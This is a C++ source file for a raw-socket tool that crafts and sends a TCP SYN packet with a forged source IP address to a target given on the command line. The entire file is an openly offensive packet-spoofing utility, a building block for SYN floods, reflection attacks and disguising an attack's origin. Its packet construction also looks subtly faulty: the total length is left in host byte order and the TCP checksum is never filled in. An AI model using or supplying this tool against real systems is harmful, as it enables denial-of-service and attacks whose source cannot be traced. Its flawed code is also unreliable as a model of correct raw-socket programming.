// Compile: g++ -o ip_spoof ip_spoof.cpp
// Run: sudo ./ip_spoof <target_ip> <target_port> <spoofed_src_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>

class IPSpoofer {
private:
    int sock;
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
public:
    IPSpoofer() {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sock < 0) { perror("socket"); exit(1); }
        
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    }
    
    void sendSpoofed(const char* targetIP, int targetPort, 
                     const char* srcIP, const char* data = "") {
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(targetPort);
        target.sin_addr.s_addr = inet_addr(targetIP);
        
        char packet[4096];
        struct iphdr* ip = (struct iphdr*)packet;
        struct tcphdr* tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));
        
        memset(packet, 0, 4096);
        
        int dataLen = strlen(data);
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + dataLen;
        ip->ttl = 64;
        ip->protocol = IPPROTO_TCP;
        ip->saddr = inet_addr(srcIP);
        ip->daddr = target.sin_addr.s_addr;
        
        tcp->source = htons(rand() % 65535);
        tcp->dest = target.sin_port;
        tcp->seq = rand();
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = htons(65535);
        
        if (dataLen > 0) {
            memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr), data, dataLen);
        }
        
        ip->check = checksum(ip, sizeof(struct iphdr));
        
        sendto(sock, packet, ip->tot_len, 0, 
               (struct sockaddr*)&target, sizeof(target));
    }
    
    ~IPSpoofer() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc < 4) {
        std::cerr << "Usage: " << argv[0] << " <target_ip> <target_port> <spoofed_src_ip>\n";
        return 1;
    }
    IPSpoofer spoofer;
    spoofer.sendSpoofed(argv[1], atoi(argv[2]), argv[3]);
    return 0;
}